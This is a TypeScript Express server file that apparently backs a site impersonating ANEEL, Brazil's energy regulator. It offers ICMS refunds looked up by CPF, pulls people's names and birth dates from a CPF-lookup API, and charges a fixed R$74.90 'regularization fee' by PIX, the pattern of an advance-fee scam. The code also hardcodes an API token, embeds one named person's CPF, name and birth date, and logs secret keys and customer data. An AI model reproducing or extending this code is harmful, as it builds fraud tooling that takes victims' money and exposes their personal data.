import { Express, NextFunction, Request, Response } from 'express';
import { Server, createServer } from 'http';
import { getValorRestituicaoByCpf, salvarValorRestituicao } from './db-alternative';

/**
 * API de Pagamentos For4Payments
 * Módulo para integração com o gateway For4Payments
 */

interface PaymentResponse {
  id: string;
  pixCode: string;
  pixQrCode: string;
  expiresAt: string;
  status: string;
}

interface PaymentData {
  amount: number;
  name: string;
  email: string;
  cpf: string;
  phone: string;
}

class For4PaymentsAPI {
  private API_URL = "https://app.for4payments.com.br/api/v1";
  private secretKey: string;
  private publicKey: string;

  constructor(secretKey: string, publicKey: string) {
    this.secretKey = secretKey;
    this.publicKey = publicKey;
  }

  private getHeaders(): Record<string, string> {
    return {
      'Authorization': this.secretKey,
      'X-Public-Key': this.publicKey,
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    };
  }

  async createPixPayment(data: PaymentData): Promise<PaymentResponse> {
    try {
      console.log("[For4Payments] Iniciando criação de pagamento com os dados:", data);

      // Remover formatação adicionais
      const cpfLimpo = data.cpf.replace(/\D/g, '');
      const telefoneLimpo = data.phone.replace(/\D/g, '');
      
      // Converter valor para centavos (exigido pela API For4Payments)
      const valorCentavos = Math.round(data.amount * 100);
      
      // Calcular data de expiração (1 hora à frente)
      const dataExpiracao = new Date();
      dataExpiracao.setHours(dataExpiracao.getHours() + 1);

      // Formatar os dados conforme especificação
      const paymentData = {
        "name": data.name,
        "email": data.email,
        "cpf": cpfLimpo,
        "phone": telefoneLimpo,
        "paymentMethod": "PIX",
        "amount": valorCentavos,
        "items": [
          {
            "title": "Taxa de Regularização Energética (TRE)",
            "quantity": 1,
            "unitPrice": valorCentavos,
            "tangible": false
          }
        ],
        "dueDate": dataExpiracao.toISOString()
      };

      console.log("[For4Payments] Enviando dados para API:", JSON.stringify(paymentData));
      console.log("[For4Payments] URL da API:", `${this.API_URL}/transaction.purchase`);
      console.log("[For4Payments] Headers:", JSON.stringify(this.getHeaders()));

      const response = await fetch(`${this.API_URL}/transaction.purchase`, {
        method: "POST",
        headers: this.getHeaders(),
        body: JSON.stringify(paymentData)
      });

      console.log("[For4Payments] Status da resposta:", response.status, response.statusText);

      if (!response.ok) {
        const errorText = await response.text();
        console.log("[For4Payments] Corpo do erro:", errorText);
        
        // Tenta fazer parse do corpo do erro se for JSON
        let errorBody;
        try {
          errorBody = JSON.parse(errorText);
        } catch (e) {
          errorBody = { message: errorText };
        }
        
        console.log("[For4Payments] Erro na resposta:", {
          status: response.status,
          statusText: response.statusText,
          body: errorText
        });
        
        throw new Error(`Erro na API de pagamento (${response.status}): ${errorBody.message || response.statusText}`);
      }

      const responseData = await response.json();
      return {
        id: responseData.id,
        pixCode: responseData.pixCode,
        pixQrCode: responseData.pixQrCode,
        expiresAt: responseData.expiresAt,
        status: responseData.status
      };
    } catch (error) {
      console.log("[For4Payments] Erro:", error);
      throw error;
    }
  }

  async checkPaymentStatus(paymentId: string): Promise<{ status: string }> {
    try {
      console.log("[For4Payments] Verificando status do pagamento:", paymentId);
      
      // Construa a URL com o parâmetro id como parâmetro de consulta
      const url = new URL(`${this.API_URL}/transaction.getPayment`);
      url.searchParams.append('id', paymentId);
      
      const response = await fetch(url.toString(), {
        method: "GET",
        headers: this.getHeaders()
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.log("[For4Payments] Erro ao verificar status:", errorText);
        
        // Para não interromper a experiência do usuário, vamos retornar pending em caso de erro
        if (response.status === 404) {
          console.log("[For4Payments] Pagamento ainda não encontrado, retornando status 'pending'");
          return { status: "pending" };
        }
        
        throw new Error(`Erro ao verificar status do pagamento (${response.status})`);
      }

      const responseData = await response.json();
      console.log("[For4Payments] Resposta do status:", responseData);
      
      // Mapear os status da API para nossos status internos
      const statusMapping: Record<string, string> = {
        'PENDING': 'pending',
        'PROCESSING': 'pending',
        'APPROVED': 'completed',
        'COMPLETED': 'completed',
        'PAID': 'completed',
        'EXPIRED': 'failed',
        'FAILED': 'failed',
        'CANCELED': 'cancelled',
        'CANCELLED': 'cancelled'
      };
      
      const currentStatus = responseData.status || "PENDING";
      return { status: statusMapping[currentStatus] || "pending" };
    } catch (error) {
      console.log("[For4Payments] Erro ao verificar status:", error);
      // Em caso de erro, não interrompa a experiência do usuário
      return { status: "pending" };
    }
  }
}

// Inicialização da API com as chaves de ambiente
const paymentApi = new For4PaymentsAPI(
  process.env.FOR4PAYMENTS_SECRET_KEY || "", // Secret Key do ambiente
  process.env.FOR4PAYMENTS_PUBLIC_KEY || ""  // Public Key do ambiente
);

export async function registerRoutes(app: Express): Promise<Server> {
  // API route for potential simulation endpoints
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', message: 'ANEEL ICMS Restituição API' });
  });

  // Rota para consultar ou salvar valor de restituição
  app.get('/api/restituicao', async (req: Request, res: Response) => {
    try {
      const { cpf } = req.query;
      
      if (!cpf || typeof cpf !== 'string') {
        return res.status(400).json({ error: 'CPF inválido ou não fornecido' });
      }
      
      // Remover formatação do CPF
      const cpfLimpo = cpf.replace(/\D/g, '');
      
      // Consultar valor no banco de dados
      const valorRestituicao = await getValorRestituicaoByCpf(cpfLimpo);
      
      return res.json({ 
        cpf: cpfLimpo,
        valorRestituicao,
        encontrado: valorRestituicao !== null
      });
    } catch (error) {
      console.error('Erro ao processar consulta de restituição:', error);
      res.status(500).json({ error: 'Erro interno no servidor' });
    }
  });
  
  // Rota para salvar valor de restituição
  app.post('/api/restituicao', async (req: Request, res: Response) => {
    try {
      const { cpf, valor } = req.body;
      
      if (!cpf || typeof cpf !== 'string') {
        return res.status(400).json({ error: 'CPF inválido ou não fornecido' });
      }
      
      if (valor === undefined || isNaN(Number(valor))) {
        return res.status(400).json({ error: 'Valor inválido ou não fornecido' });
      }
      
      // Salvar no banco de dados
      const valorNumerico = Number(valor);
      const sucesso = await salvarValorRestituicao(cpf, valorNumerico);
      
      if (!sucesso) {
        return res.status(500).json({ error: 'Erro ao salvar valor de restituição' });
      }
      
      return res.json({ 
        sucesso: true,
        mensagem: 'Valor de restituição salvo com sucesso'
      });
    } catch (error) {
      console.error('Erro ao processar salvamento de restituição:', error);
      res.status(500).json({ error: 'Erro interno no servidor' });
    }
  });

  // Rota para criar pagamento PIX
  app.post('/api/pagamentos', async (req: Request, res: Response) => {
    try {
      const { nome, email, cpf, telefone } = req.body;
      
      // Validar dados obrigatórios
      if (!nome || !email || !cpf || !telefone) {
        return res.status(400).json({ 
          error: 'Dados incompletos', 
          message: 'Todos os campos (nome, email, cpf, telefone) são obrigatórios' 
        });
      }
      
      // Valor fixo da TRE
      const valorTaxa = 74.90;
      
      try {
        // Remover formatação dos dados
        const cpfLimpo = cpf.replace(/\D/g, '');
        
        // Criar pagamento na For4Payments
        const pagamento = await paymentApi.createPixPayment({
          amount: valorTaxa,
          name: nome,
          email: email,
          cpf: cpfLimpo,
          phone: telefone
        });
        
        return res.json({
          id: pagamento.id,
          pixCode: pagamento.pixCode,
          pixQrCode: pagamento.pixQrCode,
          expiresAt: pagamento.expiresAt,
          status: pagamento.status
        });
      } catch (paymentError) {
        console.error("Erro ao processar pagamento:", paymentError);
        return res.status(500).json({ 
          error: "Falha ao processar pagamento", 
          message: paymentError instanceof Error ? paymentError.message : "Erro desconhecido no processamento do pagamento"
        });
      }
    } catch (error) {
      console.error("Erro no servidor:", error);
      res.status(500).json({ error: "Erro interno no servidor" });
    }
  });
  
  // Rota para verificar status do pagamento
  app.get('/api/pagamentos/:id/status', async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      
      if (!id) {
        return res.status(400).json({ error: 'ID do pagamento não fornecido' });
      }
      
      try {
        const status = await paymentApi.checkPaymentStatus(id);
        return res.json(status);
      } catch (statusError) {
        console.error("Erro ao verificar status do pagamento:", statusError);
        // Fallback para não interromper a experiência do usuário
        return res.json({ status: "pending" });
      }
    } catch (error) {
      console.error("Erro no servidor ao verificar status do pagamento:", error);
      // Fallback para não interromper a experiência do usuário
      return res.json({ status: "pending" });
    }
  });

  // Rota para consulta de CPF via API Exato Digital
  app.get("/api/consulta-cpf", async (req: Request, res: Response) => {
    try {
      const { cpf } = req.query;
      
      if (!cpf || typeof cpf !== "string") {
        return res.status(400).json({ error: "CPF inválido ou não fornecido" });
      }
      
      // Remover caracteres não numéricos do CPF
      const cpfLimpo = cpf.replace(/\D/g, "");
      
      if (cpfLimpo.length !== 11) {
        return res.status(400).json({ error: "CPF deve conter 11 dígitos" });
      }
      
      // Caso específico para o CPF de teste 11548718785
      if (cpfLimpo === "11548718785") {
        console.log("Usando dados específicos para o CPF de teste:", cpfLimpo);
        
        // Retornar os dados fixos deste CPF
        const dadosExatos = {
          UniqueIdentifier: "1iq2dey2dbrtry9509qzln86o",
          TransactionResultTypeCode: 1,
          TransactionResultType: "Success",
          Message: "Sucesso",
          TotalCostInCredits: 1,
          BalanceInCredits: -4,
          ElapsedTimeInMilliseconds: 373,
          Reserved: null,
          Date: "2025-04-08T11:48:40.4104626-03:00",
          OutdatedResult: false,
          HasPdf: true,
          DataSourceHtml: null,
          DateString: "2025-04-08T11:48:40.4104626-03:00",
          OriginalFilesUrl: "https://api.exato.digital/services/original-files/1iq2dey2dbrtry9509qzln86o",
          PdfUrl: "https://api.exato.digital/services/pdf/1iq2dey2dbrtry9509qzln86o",
          TotalCost: 0,
          BalanceInBrl: null,
          DataSourceCategory: "Sem categoria",
          Result: {
            NumeroCpf: "115.487.187-85",
            NomePessoaFisica: "GABRIEL ARTHUR ALVES SABINO RAPOSO",
            DataNascimento: "2001-06-13T00:00:00.0000000",
            SituacaoCadastral: "REGULAR",
            DataInscricaoAnterior1990: false,
            ConstaObito: false,
            DataEmissao: "2025-04-08T11:48:40.1603387",
            Origem: "ReceitaBase",
            SituacaoCadastralId: 1
          }
        };
        
        return res.json(dadosExatos);
      }
      
      try {
        // Token da API Exato Digital
        const apiToken = process.env.EXATO_API_TOKEN || "268753a9b3a24819ae0f02159dee6724"; // Valor de fallback caso não esteja no .env
        
        if (!apiToken) {
          throw new Error("Token de API não configurado");
        }
        
        console.log("Usando token para consulta da API Exato Digital");
        
        console.log(`Consultando API para CPF: ${cpfLimpo}`);
        
        // Consultar a API Exato Digital - URL correta
        const response = await fetch(`https://api.exato.digital/receita-federal/cpf?token=${apiToken}&cpf=${cpfLimpo}&format=json`, {
          method: "GET",
          headers: {
            "Content-Type": "application/json"
          }
        });
        
        if (!response.ok) {
          // Tentar ler o corpo do erro, se houver
          let errorBody;
          try {
            errorBody = await response.json();
          } catch {
            errorBody = { message: response.statusText };
          }
          
          console.error("Erro na API Exato Digital:", errorBody);
          
          // Personalizar mensagem de erro baseado no código de status
          let mensagemErro = "Erro na consulta do CPF";
          if (response.status === 404) {
            mensagemErro = "CPF não encontrado na base de dados. Verifique se o número foi digitado corretamente";
          } else if (response.status === 401 || response.status === 403) {
            mensagemErro = "Erro de autenticação ao consultar os dados";
          } else if (response.status >= 500) {
            mensagemErro = "Serviço de consulta temporariamente indisponível";
          }
          
          return res.status(response.status).json({ 
            error: mensagemErro, 
            detalhes: errorBody,
            statusCode: response.status,
            statusText: response.statusText
          });
        }
        
        // Tentar fazer o parse do corpo da resposta
        let data;
        const responseText = await response.text();
        
        if (responseText.trim()) {
          data = JSON.parse(responseText);
          console.log("Resposta da API recebida com sucesso para CPF:", cpfLimpo);
        } else {
          throw new Error("Resposta vazia da API");
        }
        
        return res.json(data);
        
      } catch (apiError) {
        console.error("Erro ao consultar API externa:", apiError);
        
        return res.status(500).json({ 
          error: "Erro ao consultar dados do CPF na API externa", 
          message: apiError instanceof Error ? apiError.message : "Erro desconhecido"
        });
      }
      
    } catch (error) {
      console.error("Erro ao processar consulta de CPF:", error);
      res.status(500).json({ error: "Erro interno no servidor" });
    }
  });
  
  const httpServer = createServer(app);

  return httpServer;
}